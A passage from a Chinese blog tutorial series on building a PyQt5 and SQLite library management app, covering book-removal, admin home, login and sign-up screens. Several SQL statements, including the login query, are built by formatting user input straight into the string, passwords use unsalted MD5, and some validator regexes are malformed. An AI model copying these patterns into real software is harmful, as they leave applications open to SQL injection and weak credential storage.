添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(self.dropNumLabel, self.dropNumEdit)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.dropBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line">        self.dropNumLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookNameEdit.setReadOnly(True)</span><br><span class="line">        self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setReadOnly(True)</span><br><span class="line">        self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setReadOnly(True)</span><br><span class="line">        self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.dropNumEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.dropBookButton.setFont(font)</span><br><span class="line">        self.dropBookButton.setFixedHeight(32)</span><br><span class="line">        self.dropBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line"></span><br><span class="line">        self.dropBookButton.clicked.connect(self.dropBookButtonClicked)</span><br><span class="line">        self.bookIdEdit.textChanged.connect(self.bookIdEditChanged)</span><br><span class="line"></span><br><span class="line">    def bookIdEditChanged(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        if (bookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            self.bookNameEdit.clear()</span><br><span class="line">            self.publisherEdit.clear()</span><br><span class="line">            self.authNameEdit.clear()</span><br><span class="line">            self.dropNumEdit.clear()</span><br><span class="line">            self.publishTime.clear()</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        # 查询对应书号，如果存在就更新form</span><br><span class="line">        if (query.next()):</span><br><span class="line">            self.bookNameEdit.setText(query.value(0))</span><br><span class="line">            self.authNameEdit.setText(query.value(2))</span><br><span class="line">            self.categoryComboBox.setCurrentText(query.value(3))</span><br><span class="line">            self.publisherEdit.setText(query.value(4))</span><br><span class="line">            self.publishTime.setText(query.value(5))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def dropBookButtonClicked(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        dropNum &#x3D; 0</span><br><span class="line">        if (self.dropNumEdit.text() &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;淘汰数目为空，请检查输入，操作失败&quot;), QMessageBox.Yes, QMessageBox.Yes)</span><br><span class="line">            return</span><br><span class="line">        dropNum &#x3D; int(self.dropNumEdit.text())</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next()):</span><br><span class="line">            if (dropNum &gt; query.value(7) or dropNum &lt; 0):</span><br><span class="line">                print(QMessageBox.warning(self, &quot;警告&quot;, &quot;最多可淘汰%d本，请检查输入&quot; % (query.value(7)), QMessageBox.Yes,</span><br><span class="line">                                          QMessageBox.Yes))</span><br><span class="line">                return</span><br><span class="line">        # 更新Book表和BuyorDrop表</span><br><span class="line">        # 如果drop书目和当前库存相同，则直接删除Book记录（这里先默认当前所有书都在库存中）</span><br><span class="line">        if (dropNum &#x3D;&#x3D; query.value(6)):</span><br><span class="line">            sql &#x3D; &quot;DELETE  FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        else:</span><br><span class="line">            sql &#x3D; &quot;UPDATE BOOK SET NumStorage&#x3D;NumStorage-%d,NumCanBorrow&#x3D;NumCanBorrow-%d WHERE BookId&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                dropNum, dropNum, bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        sql &#x3D; &quot;INSERT INTO buyordrop VALUES (&#39;%s&#39;,&#39;%s&#39;,0,%d)&quot; % (bookId, timenow, dropNum)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        print(QMessageBox.information(self, &quot;提示&quot;, &quot;淘汰书籍成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        self.drop_book_successful_signal.emit()</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; dropBookDialog()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><p>可以看到里面有两个函数，<code>bookIdEditChanged</code>和<code>dropBookButtonClicked</code></p><p>其中<code>bookIdEditChanged</code>用来实现实时监测是否填充信息<br><code>dropBookButtonClicked</code>实现点击淘汰的逻辑</p><p>当监测到书号的	<code>QLineEdit</code>被更改时触发<code>bookIdEditChanged</code>，从数据库检查是否存在该书，如果有则添加</p><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8vaosh9j308d0bza9z.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8v96qxjj308f0c2aa1.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（4）——管理员主页设计</title>
    <url>/a8b56f4b.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>在管理员主页，为了完成初步的功能，即添加书本，淘汰书本，查看库存，我们需要设计以下：</p><ul><li>一个添加书本的Dialog，通过一个button启用</li><li>一个淘汰书本的Dialog，通过一个button启用</li><li>一个查看库存的Table， 一开始打算用一个button启用的，后来觉得直接放主页也挺好的，所以并没有用button启用（虽然依然放在设计中）</li></ul><a id="more"></a><h2><span id="pdai-ma">代码</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from addBookDialog import addBookDialog</span><br><span class="line">from dropBookDialog import dropBookDialog</span><br><span class="line">from BookStorageViewer import BookStorageViewer</span><br><span class="line">from UserManage import UserManage</span><br><span class="line"></span><br><span class="line">class AdminHome(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.layout &#x3D; QHBoxLayout()</span><br><span class="line">        self.buttonlayout &#x3D; QVBoxLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.userManageButton &#x3D; QPushButton(&quot;用户管理&quot;)</span><br><span class="line">        self.addBookButton &#x3D; QPushButton(&quot;添加书籍&quot;)</span><br><span class="line">        self.dropBookButton &#x3D; QPushButton(&quot;淘汰书籍&quot;)</span><br><span class="line">        self.userManageButton.setFont(font)</span><br><span class="line">        self.addBookButton.setFont(font)</span><br><span class="line">        self.dropBookButton.setFont(font)</span><br><span class="line">        self.userManageButton.setFixedWidth(100)</span><br><span class="line">        self.userManageButton.setFixedHeight(42)</span><br><span class="line">        self.addBookButton.setFixedWidth(100)</span><br><span class="line">        self.addBookButton.setFixedHeight(42)</span><br><span class="line">        self.dropBookButton.setFixedWidth(100)</span><br><span class="line">        self.dropBookButton.setFixedHeight(42)</span><br><span class="line">        self.buttonlayout.addWidget(self.addBookButton)</span><br><span class="line">        self.buttonlayout.addWidget(self.dropBookButton)</span><br><span class="line">        self.buttonlayout.addWidget(self.userManageButton)</span><br><span class="line">        self.layout.addLayout(self.buttonlayout)</span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.layout.addWidget(self.storageView)</span><br><span class="line"></span><br><span class="line">        self.addBookButton.clicked.connect(self.addBookButtonClicked)</span><br><span class="line">        self.dropBookButton.clicked.connect(self.dropBookButtonClicked)</span><br><span class="line">        self.userManageButton.clicked.connect(self.userManage)</span><br><span class="line"></span><br><span class="line">    def addBookButtonClicked(self):</span><br><span class="line">        addDialog &#x3D; addBookDialog(self)</span><br><span class="line">        addDialog.add_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        addDialog.show()</span><br><span class="line">        addDialog.exec_()</span><br><span class="line"></span><br><span class="line">    def dropBookButtonClicked(self):</span><br><span class="line">        dropDialog &#x3D; dropBookDialog(self)</span><br><span class="line">        dropDialog.drop_book_successful_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        dropDialog.show()</span><br><span class="line">        dropDialog.exec_()</span><br><span class="line"></span><br><span class="line">    def userManage(self):</span><br><span class="line">        UserDelete&#x3D;UserManage(self)</span><br><span class="line">        UserDelete.show()</span><br><span class="line">        UserDelete.exec_()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; AdminHome()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><blockquote><p>整段代码非常简短，逻辑也很清晰。<br>1、在setUpUI中有一个淘汰的button，一个添加的button<br>2、使用信号与槽机制，当点击添加按钮时，启用addBookDialog，点击淘汰按钮时，启用dropBookDialog<br>3、主页还有一个BookStorageViewer用于查看库存<br>**注意：**两个diolog和一个Table，我会在接下来的blog中给出</p></blockquote><h2><span id="pxiao-guo">效果</span><a href="#pxiao-guo" class="header-anchor">#</a></h2><p>虽然代码还不全，但也先看看最后效果吧~<br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8r2vdvfj30p50hmq3n.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8r260t9j30ot0hlwf8.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（3）——登录页面设计</title>
    <url>/98a38c48.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>登录页面的逻辑很简单，如下：</p><ul><li>用户输入学号和密码（安全起见，加上输入检测）</li><li>如果密码错误或者用户名不存在，则给出提示</li><li>如果正确，则进行跳转</li></ul><a id="more"></a><h2><span id="pdai-ma">代码：</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import hashlib</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SignInWidget(QWidget):</span><br><span class="line">    is_admin_signal &#x3D; pyqtSignal()</span><br><span class="line">    is_student_signal &#x3D; pyqtSignal(str)</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(SignInWidget, self).__init__()</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.Vlayout &#x3D; QVBoxLayout(self)</span><br><span class="line">        self.Hlayout1 &#x3D; QHBoxLayout()</span><br><span class="line">        self.Hlayout2 &#x3D; QHBoxLayout()</span><br><span class="line">        self.formlayout &#x3D; QFormLayout()</span><br><span class="line"></span><br><span class="line">        self.label1 &#x3D; QLabel(&quot;学号: &quot;)</span><br><span class="line">        labelFont &#x3D; QFont()</span><br><span class="line">        labelFont.setPixelSize(18)</span><br><span class="line">        lineEditFont &#x3D; QFont()</span><br><span class="line">        lineEditFont.setPixelSize(16)</span><br><span class="line">        self.label1.setFont(labelFont)</span><br><span class="line">        self.lineEdit1 &#x3D; QLineEdit()</span><br><span class="line">        self.lineEdit1.setFixedHeight(32)</span><br><span class="line">        self.lineEdit1.setFixedWidth(180)</span><br><span class="line">        self.lineEdit1.setFont(lineEditFont)</span><br><span class="line">        self.lineEdit1.setMaxLength(10)</span><br><span class="line"></span><br><span class="line">        self.formlayout.addRow(self.label1, self.lineEdit1)</span><br><span class="line"></span><br><span class="line">        self.label2 &#x3D; QLabel(&quot;密码: &quot;)</span><br><span class="line">        self.label2.setFont(labelFont)</span><br><span class="line">        self.lineEdit2 &#x3D; QLineEdit()</span><br><span class="line">        self.lineEdit2.setFixedHeight(32)</span><br><span class="line">        self.lineEdit2.setFixedWidth(180)</span><br><span class="line">        self.lineEdit2.setMaxLength(16)</span><br><span class="line"></span><br><span class="line">        # 设置验证</span><br><span class="line">        reg &#x3D; QRegExp(&quot;PB[0~9]&#123;8&#125;&quot;)</span><br><span class="line">        pValidator &#x3D; QRegExpValidator(self)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.lineEdit1.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        reg &#x3D; QRegExp(&quot;[a-zA-z0-9]+$&quot;)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.lineEdit2.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        passwordFont &#x3D; QFont()</span><br><span class="line">        passwordFont.setPixelSize(10)</span><br><span class="line">        self.lineEdit2.setFont(passwordFont)</span><br><span class="line"></span><br><span class="line">        self.lineEdit2.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.formlayout.addRow(self.label2, self.lineEdit2)</span><br><span class="line">        self.signIn &#x3D; QPushButton(&quot;登 录&quot;)</span><br><span class="line">        self.signIn.setFixedWidth(80)</span><br><span class="line">        self.signIn.setFixedHeight(30)</span><br><span class="line">        self.signIn.setFont(labelFont)</span><br><span class="line">        self.formlayout.addRow(&quot;&quot;, self.signIn)</span><br><span class="line"></span><br><span class="line">        self.label &#x3D; QLabel(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        fontlabel &#x3D; QFont()</span><br><span class="line">        fontlabel.setPixelSize(30)</span><br><span class="line">        self.label.setFixedWidth(390)</span><br><span class="line">        # self.label.setFixedHeight(80)</span><br><span class="line">        self.label.setFont(fontlabel)</span><br><span class="line">        self.Hlayout1.addWidget(self.label, Qt.AlignCenter)</span><br><span class="line">        self.widget1 &#x3D; QWidget()</span><br><span class="line">        self.widget1.setLayout(self.Hlayout1)</span><br><span class="line">        self.widget2 &#x3D; QWidget()</span><br><span class="line">        self.widget2.setFixedWidth(300)</span><br><span class="line">        self.widget2.setFixedHeight(150)</span><br><span class="line">        self.widget2.setLayout(self.formlayout)</span><br><span class="line">        self.Hlayout2.addWidget(self.widget2, Qt.AlignCenter)</span><br><span class="line">        self.widget &#x3D; QWidget()</span><br><span class="line">        self.widget.setLayout(self.Hlayout2)</span><br><span class="line">        self.Vlayout.addWidget(self.widget1)</span><br><span class="line">        self.Vlayout.addWidget(self.widget, Qt.AlignTop)</span><br><span class="line"></span><br><span class="line">        self.signIn.clicked.connect(self.signInCheck)</span><br><span class="line">        self.lineEdit2.returnPressed.connect(self.signInCheck)</span><br><span class="line">        self.lineEdit1.returnPressed.connect(self.signInCheck)</span><br><span class="line"></span><br><span class="line">    def signInCheck(self):</span><br><span class="line">        studentId &#x3D; self.lineEdit1.text()</span><br><span class="line">        password &#x3D; self.lineEdit2.text()</span><br><span class="line">        if (studentId &#x3D;&#x3D; &quot;&quot; or password &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;学号和密码不可为空!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 打开数据库连接</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM user WHERE StudentId&#x3D;&#39;%s&#39;&quot; % (studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line">        hl &#x3D; hashlib.md5()</span><br><span class="line">        hl.update(password.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.information(self, &quot;提示&quot;, &quot;该账号不存在!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        else:</span><br><span class="line">            if (studentId &#x3D;&#x3D; query.value(0) and hl.hexdigest() &#x3D;&#x3D; query.value(2)):</span><br><span class="line">                # 如果是管理员</span><br><span class="line">                if (query.value(3)&#x3D;&#x3D;1):</span><br><span class="line">                    self.is_admin_signal.emit()</span><br><span class="line">                else:</span><br><span class="line">                    self.is_student_signal.emit(studentId)</span><br><span class="line">            else:</span><br><span class="line">                print(QMessageBox.information(self, &quot;提示&quot;, &quot;密码错误!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; SignInWidget()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pxiao-guo-ru-xia">效果如下</span><a href="#pxiao-guo-ru-xia" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8klay6vj311s0j4acf.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8kkcn55j30p70htgm8.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8kjr1jzj30p00higm6.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（2）——注册页面设计</title>
    <url>/72587310.html</url>
    <content><![CDATA[<blockquote><p>我觉得最cd的就是QtDesigner虽然适合快速开发UI，但是我总用不好，只能纯代码来实现界面了。现在大家能看到的一开始的UI设计和一点逻辑，并不包含总体应用的的逻辑体系</p></blockquote><a id="more"></a><h2><span id="pdai-ma">代码：</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SignUpWidget(QWidget):</span><br><span class="line">    student_signup_signal &#x3D; pyqtSignal(str)</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎登陆图书馆管理系统&quot;)</span><br><span class="line">        self.signUpLabel &#x3D; QLabel(&quot;注   册&quot;)</span><br><span class="line">        self.signUpLabel.setAlignment(Qt.AlignCenter)</span><br><span class="line">        # self.signUpLabel.setFixedWidth(300)</span><br><span class="line">        self.signUpLabel.setFixedHeight(100)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(36)</span><br><span class="line">        lineEditFont &#x3D; QFont()</span><br><span class="line">        lineEditFont.setPixelSize(16)</span><br><span class="line">        self.signUpLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.layout &#x3D; QVBoxLayout()</span><br><span class="line">        self.layout.addWidget(self.signUpLabel, Qt.AlignHCenter)</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line">        # 表单，包括学号，姓名，密码，确认密码</span><br><span class="line">        self.formlayout &#x3D; QFormLayout()</span><br><span class="line">        font.setPixelSize(18)</span><br><span class="line">        # Row1</span><br><span class="line">        self.studentIdLabel &#x3D; QLabel(&quot;学    号: &quot;)</span><br><span class="line">        self.studentIdLabel.setFont(font)</span><br><span class="line">        self.studentIdLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.studentIdLineEdit.setFixedWidth(180)</span><br><span class="line">        self.studentIdLineEdit.setFixedHeight(32)</span><br><span class="line">        self.studentIdLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.studentIdLineEdit.setMaxLength(10)</span><br><span class="line">        self.formlayout.addRow(self.studentIdLabel, self.studentIdLineEdit)</span><br><span class="line"></span><br><span class="line">        # Row2</span><br><span class="line">        self.studentNameLabel &#x3D; QLabel(&quot;姓    名: &quot;)</span><br><span class="line">        self.studentNameLabel.setFont(font)</span><br><span class="line">        self.studentNameLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.studentNameLineEdit.setFixedHeight(32)</span><br><span class="line">        self.studentNameLineEdit.setFixedWidth(180)</span><br><span class="line">        self.studentNameLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.studentNameLineEdit.setMaxLength(10)</span><br><span class="line">        self.formlayout.addRow(self.studentNameLabel, self.studentNameLineEdit)</span><br><span class="line"></span><br><span class="line">        lineEditFont.setPixelSize(10)</span><br><span class="line"></span><br><span class="line">        # Row3</span><br><span class="line">        self.passwordLabel &#x3D; QLabel(&quot;密    码: &quot;)</span><br><span class="line">        self.passwordLabel.setFont(font)</span><br><span class="line">        self.passwordLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.passwordLineEdit.setFixedWidth(180)</span><br><span class="line">        self.passwordLineEdit.setFixedHeight(32)</span><br><span class="line">        self.passwordLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.passwordLineEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.passwordLineEdit.setMaxLength(16)</span><br><span class="line">        self.formlayout.addRow(self.passwordLabel, self.passwordLineEdit)</span><br><span class="line"></span><br><span class="line">        # Row4</span><br><span class="line">        self.passwordConfirmLabel &#x3D; QLabel(&quot;确认密码: &quot;)</span><br><span class="line">        self.passwordConfirmLabel.setFont(font)</span><br><span class="line">        self.passwordConfirmLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.passwordConfirmLineEdit.setFixedWidth(180)</span><br><span class="line">        self.passwordConfirmLineEdit.setFixedHeight(32)</span><br><span class="line">        self.passwordConfirmLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.passwordConfirmLineEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.passwordConfirmLineEdit.setMaxLength(16)</span><br><span class="line">        self.formlayout.addRow(self.passwordConfirmLabel, self.passwordConfirmLineEdit)</span><br><span class="line"></span><br><span class="line">        # Row5</span><br><span class="line">        self.signUpbutton &#x3D; QPushButton(&quot;注 册&quot;)</span><br><span class="line">        self.signUpbutton.setFixedWidth(120)</span><br><span class="line">        self.signUpbutton.setFixedHeight(30)</span><br><span class="line">        self.signUpbutton.setFont(font)</span><br><span class="line">        self.formlayout.addRow(&quot;&quot;, self.signUpbutton)</span><br><span class="line">        widget &#x3D; QWidget()</span><br><span class="line">        widget.setLayout(self.formlayout)</span><br><span class="line">        widget.setFixedHeight(250)</span><br><span class="line">        widget.setFixedWidth(300)</span><br><span class="line">        self.Hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        self.Hlayout.addWidget(widget, Qt.AlignCenter)</span><br><span class="line">        widget &#x3D; QWidget()</span><br><span class="line">        widget.setLayout(self.Hlayout)</span><br><span class="line">        self.layout.addWidget(widget, Qt.AlignHCenter)</span><br><span class="line"></span><br><span class="line">        # 设置验证</span><br><span class="line">        reg &#x3D; QRegExp(&quot;PB[0~9]&#123;8&#125;&quot;)</span><br><span class="line">        pValidator &#x3D; QRegExpValidator(self)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.studentIdLineEdit.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        reg &#x3D; QRegExp(&quot;[a-zA-z0-9]+$&quot;)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.passwordLineEdit.setValidator(pValidator)</span><br><span class="line">        self.passwordConfirmLineEdit.setValidator(pValidator)</span><br><span class="line">        self.signUpbutton.clicked.connect(self.SignUp)</span><br><span class="line">        self.studentIdLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line">        self.studentNameLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line">        self.passwordLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line">        self.passwordConfirmLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line"></span><br><span class="line">    def 